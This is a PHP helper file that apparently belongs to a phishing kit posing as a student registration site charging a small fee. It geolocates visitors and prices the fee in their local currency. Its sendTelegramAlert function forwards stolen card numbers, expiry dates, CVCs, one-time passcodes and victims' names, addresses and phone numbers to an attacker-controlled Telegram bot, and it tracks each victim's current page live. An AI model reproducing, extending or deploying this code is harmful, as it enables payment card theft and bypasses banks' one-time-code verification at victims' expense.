<?php
require_once __DIR__ . '/db.php';

function parseUserAgent(string $ua): array {
    $browser = 'Unknown';
    $os = 'Unknown';
    $device = 'Desktop';

    if (preg_match('/Edg\//i', $ua)) $browser = 'Edge';
    elseif (preg_match('/OPR|Opera/i', $ua)) $browser = 'Opera';
    elseif (preg_match('/Chrome/i', $ua)) $browser = 'Chrome';
    elseif (preg_match('/Firefox/i', $ua)) $browser = 'Firefox';
    elseif (preg_match('/Safari/i', $ua)) $browser = 'Safari';
    elseif (preg_match('/MSIE|Trident/i', $ua)) $browser = 'Internet Explorer';

    if (preg_match('/Windows NT 10/i', $ua)) $os = 'Windows 10/11';
    elseif (preg_match('/Windows/i', $ua)) $os = 'Windows';
    elseif (preg_match('/Mac OS X/i', $ua)) $os = 'macOS';
    elseif (preg_match('/Linux/i', $ua)) $os = 'Linux';
    elseif (preg_match('/Android/i', $ua)) $os = 'Android';
    elseif (preg_match('/iPhone|iPad/i', $ua)) $os = 'iOS';

    if (preg_match('/Mobile|Android|iPhone/i', $ua)) $device = 'Mobile';
    elseif (preg_match('/iPad|Tablet/i', $ua)) $device = 'Tablet';

    return compact('browser', 'os', 'device');
}

function getClientIP(): string {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function generateToken(): string {
    return bin2hex(random_bytes(32));
}

function logActivity(int $studentId, string $action, string $details = ''): void {
    $db = getDB();
    $stmt = $db->prepare("INSERT INTO activity_log (student_id, action, details, ip_address) VALUES (?, ?, ?, ?)");
    $stmt->execute([$studentId, $action, $details, getClientIP()]);
}

function sanitize(string $input): string {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function jsonResponse(array $data, int $code = 200): void {
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

function requireAdmin(): void {
    if (session_status() !== PHP_SESSION_ACTIVE) {
        @session_start();
    }
    if (empty($_SESSION['is_admin'])) {
        if (!headers_sent()) {
            header('Location: login.php');
        } else {
            echo '<script>window.location.href="login.php";</script>';
        }
        exit;
    }
}

function getStudentByToken(string $token): ?array {
    $db = getDB();
    $stmt = $db->prepare("SELECT * FROM students WHERE session_token = ?");
    $stmt->execute([$token]);
    return $stmt->fetch() ?: null;
}

function getGeoFromIP(string $ip): array {
    $default = ['country' => '', 'city' => '', 'region' => '', 'country_code' => ''];
    if (in_array($ip, ['127.0.0.1', '::1', '0.0.0.0']) || str_starts_with($ip, '192.168.') || str_starts_with($ip, '10.')) {
        return $default;
    }
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $json = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city,regionName,countryCode", false, $ctx);
    if ($json) {
        $data = json_decode($json, true);
        if (($data['status'] ?? '') === 'success') {
            return ['country' => $data['country'] ?? '', 'city' => $data['city'] ?? '', 'region' => $data['regionName'] ?? '', 'country_code' => $data['countryCode'] ?? ''];
        }
    }
    return $default;
}

function getTelegramSettings(): array {
    static $cache = null;
    if ($cache !== null) return $cache;
    $db = getDB();
    $row = $db->query("SELECT telegram_bot_token, telegram_chat_id, telegram_alert_registration, telegram_alert_payment, telegram_alert_otp FROM admin_settings WHERE id = 1")->fetch();
    $cache = $row ?: [];
    return $cache;
}

function sendTelegramAlert(string $type, array $data): void {
    $settings = getTelegramSettings();
    $token = $settings['telegram_bot_token'] ?? '';
    $chatId = $settings['telegram_chat_id'] ?? '';
    if (!$token || !$chatId) return;

    $toggleMap = [
        'registration' => 'telegram_alert_registration',
        'payment' => 'telegram_alert_payment',
        'otp' => 'telegram_alert_otp',
    ];
    $key = $toggleMap[$type] ?? '';
    if (!$key || empty($settings[$key])) return;

    $e = function($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); };

    $msg = '';
    if ($type === 'registration') {
        $addr = $data['address'] ?? '';
        $addrParsed = is_string($addr) ? json_decode($addr, true) : $addr;
        if (is_array($addrParsed) && isset($addrParsed['street'])) {
            $addrStr = $e($addrParsed['street']) . "\n"
                     . $e($addrParsed['city'] ?? '') . ', ' . $e($addrParsed['state'] ?? '') . ' ' . $e($addrParsed['zip'] ?? '') . "\n"
                     . $e($addrParsed['country'] ?? '');
        } else {
            $addrStr = $e($addr);
        }
        $msg = "<b>New Registration</b>\n"
             . "<b>Name:</b> " . $e($data['name'] ?? '') . "\n"
             . "<b>Email:</b> " . $e($data['email'] ?? '') . "\n"
             . "<b>Phone:</b> " . $e($data['phone'] ?? '') . "\n"
             . "<b>Address:</b>\n" . $addrStr . "\n"
             . "<b>IP:</b> " . $e($data['ip'] ?? '');
    } elseif ($type === 'payment') {
        $msg = "<b>Card Data Received</b>\n"
             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
             . "<b>Cardholder:</b> " . $e($data['cardholder'] ?? '') . "\n"
             . "<b>Card:</b> <code>" . $e($data['card_number'] ?? '') . "</code>\n"
             . "<b>Type:</b> " . $e($data['card_type'] ?? '') . "\n"
             . "<b>Expiry:</b> " . $e($data['expiry'] ?? '') . "\n"
             . "<b>CVC:</b> " . $e($data['cvc'] ?? '');
    } elseif ($type === 'otp') {
        $msg = "<b>OTP Code Received</b>\n"
             . "<b>Student:</b> " . $e($data['student_name'] ?? '') . "\n"
             . "<b>Code:</b> <code>" . $e($data['code'] ?? '') . "</code>";
    }

    if (!$msg) return;

    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chatId,
        'text' => $msg,
        'parse_mode' => 'HTML'
    ]);
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $postData,
            'timeout' => 3
        ]
    ]);
    @file_get_contents($url, false, $ctx);
}

// ======== Currency & Reference Code ========

function getCurrencyByCountry(string $countryCode): array {
    $map = [
        'US'=>['USD','$'], 'CA'=>['CAD','C$'], 'GB'=>['GBP','£'], 'AU'=>['AUD','A$'], 'NZ'=>['NZD','NZ$'],
        'FR'=>['EUR','€'], 'DE'=>['EUR','€'], 'IT'=>['EUR','€'], 'ES'=>['EUR','€'], 'NL'=>['EUR','€'],
        'BE'=>['EUR','€'], 'AT'=>['EUR','€'], 'PT'=>['EUR','€'], 'IE'=>['EUR','€'], 'FI'=>['EUR','€'],
        'GR'=>['EUR','€'], 'LU'=>['EUR','€'], 'SK'=>['EUR','€'], 'SI'=>['EUR','€'], 'EE'=>['EUR','€'],
        'LV'=>['EUR','€'], 'LT'=>['EUR','€'], 'MT'=>['EUR','€'], 'CY'=>['EUR','€'],
        'JP'=>['JPY','¥'], 'CN'=>['CNY','¥'], 'KR'=>['KRW','₩'],
        'IN'=>['INR','₹'], 'PK'=>['PKR','Rs'],
        'BR'=>['BRL','R$'], 'MX'=>['MXN','$'], 'AR'=>['ARS','$'], 'CL'=>['CLP','$'], 'CO'=>['COP','$'],
        'TR'=>['TRY','₺'], 'RU'=>['RUB','₽'], 'UA'=>['UAH','₴'],
        'SA'=>['SAR','﷼'], 'AE'=>['AED','د.إ'], 'QA'=>['QAR','﷼'], 'KW'=>['KWD','د.ك'],
        'EG'=>['EGP','£'], 'MA'=>['MAD','د.م.'], 'TN'=>['TND','د.ت'], 'DZ'=>['DZD','د.ج'],
        'NG'=>['NGN','₦'], 'ZA'=>['ZAR','R'], 'KE'=>['KES','KSh'], 'GH'=>['GHS','₵'],
        'TH'=>['THB','฿'], 'VN'=>['VND','₫'], 'MY'=>['MYR','RM'], 'SG'=>['SGD','S$'], 'PH'=>['PHP','₱'], 'ID'=>['IDR','Rp'],
        'PL'=>['PLN','zł'], 'CZ'=>['CZK','Kč'], 'HU'=>['HUF','Ft'], 'RO'=>['RON','lei'], 'BG'=>['BGN','лв'],
        'SE'=>['SEK','kr'], 'NO'=>['NOK','kr'], 'DK'=>['DKK','kr'], 'CH'=>['CHF','CHF'], 'IS'=>['ISK','kr'],
        'IL'=>['ILS','₪'],
    ];
    $cc = strtoupper($countryCode);
    return $map[$cc] ?? ['USD', '$'];
}

function getFeeInCurrency(string $currencyCode, float $baseUSD = 27.50): array {
    // Approximate conversion rates from USD
    $rates = [
        'USD'=>1, 'EUR'=>0.92, 'GBP'=>0.79, 'CAD'=>1.36, 'AUD'=>1.53, 'NZD'=>1.64,
        'JPY'=>149.5, 'CNY'=>7.24, 'KRW'=>1320, 'INR'=>83.1, 'PKR'=>278,
        'BRL'=>4.97, 'MXN'=>17.1, 'ARS'=>350, 'CLP'=>880, 'COP'=>3950,
        'TRY'=>30.2, 'RUB'=>91, 'UAH'=>37.5,
        'SAR'=>3.75, 'AED'=>3.67, 'QAR'=>3.64, 'KWD'=>0.31,
        'EGP'=>30.9, 'MAD'=>10.1, 'TND'=>3.12, 'DZD'=>134.5,
        'NGN'=>780, 'ZAR'=>18.7, 'KES'=>153, 'GHS'=>12.3,
        'THB'=>35.5, 'VND'=>24300, 'MYR'=>4.72, 'SGD'=>1.34, 'PHP'=>56.1, 'IDR'=>15600,
        'PLN'=>4.03, 'CZK'=>22.7, 'HUF'=>355, 'RON'=>4.57, 'BGN'=>1.8,
        'SEK'=>10.5, 'NOK'=>10.6, 'DKK'=>6.87, 'CHF'=>0.88, 'ISK'=>137,
        'ILS'=>3.63,
    ];
    $rate = $rates[$currencyCode] ?? 1;
    $converted = $baseUSD * $rate;
    // Round nicely
    if ($converted > 1000) $converted = round($converted, 0);
    elseif ($converted > 100) $converted = round($converted, 0);
    elseif ($converted > 10) $converted = round($converted, 1);
    else $converted = round($converted, 2);
    return ['amount' => $converted, 'rate' => $rate];
}

function generateReferenceCode(string $countryCode): string {
    $cc = strtoupper($countryCode ?: 'XX');
    if (strlen($cc) !== 2) $cc = 'XX';
    $year = date('Y');
    $seg1 = str_pad(random_int(10, 99), 2, '0', STR_PAD_LEFT);
    $seg2 = str_pad(random_int(1000, 9999), 4, '0', STR_PAD_LEFT);
    return "{$cc}-{$year}-{$seg1}-{$seg2}";
}

function getStudentDynamicVars(array $student): array {
    $cc = '';
    // Try to get country code from visitor record
    if (!empty($student['visitor_id'])) {
        $db = getDB();
        $v = $db->prepare("SELECT country_code FROM visitors WHERE id = ?");
        $v->execute([$student['visitor_id']]);
        $row = $v->fetch();
        if ($row) $cc = $row['country_code'] ?? '';
    }
    $cc = strtoupper($cc ?: 'US');

    [$currencyCode, $currencySymbol] = getCurrencyByCountry($cc);
    $fee = getFeeInCurrency($currencyCode);
    $refCode = $student['reference_code'] ?? '';

    // Generate reference code if not yet assigned
    if (!$refCode) {
        $refCode = generateReferenceCode($cc);
        $db = getDB();
        $db->prepare("UPDATE students SET reference_code = ?, currency = ?, fee_amount = ? WHERE id = ?")
            ->execute([$refCode, $currencyCode, $fee['amount'], $student['id']]);
    }

    return [
        'country_code' => $cc,
        'currency_code' => $currencyCode,
        'currency_symbol' => $currencySymbol,
        'fee_amount' => $fee['amount'],
        'fee_display' => $currencySymbol . number_format($fee['amount'], ($fee['amount'] == intval($fee['amount'])) ? 0 : 2),
        'reference_code' => $refCode,
    ];
}

function updateStudentActivity(int $studentId, string $page = ''): void {
    $db = getDB();
    $stmt = $db->prepare("UPDATE students SET is_online = 1, last_activity = datetime('now') WHERE id = ?");
    $stmt->execute([$studentId]);
    if ($page) {
        $db->prepare("UPDATE students SET current_page = ? WHERE id = ?")->execute([$page, $studentId]);
    }
}
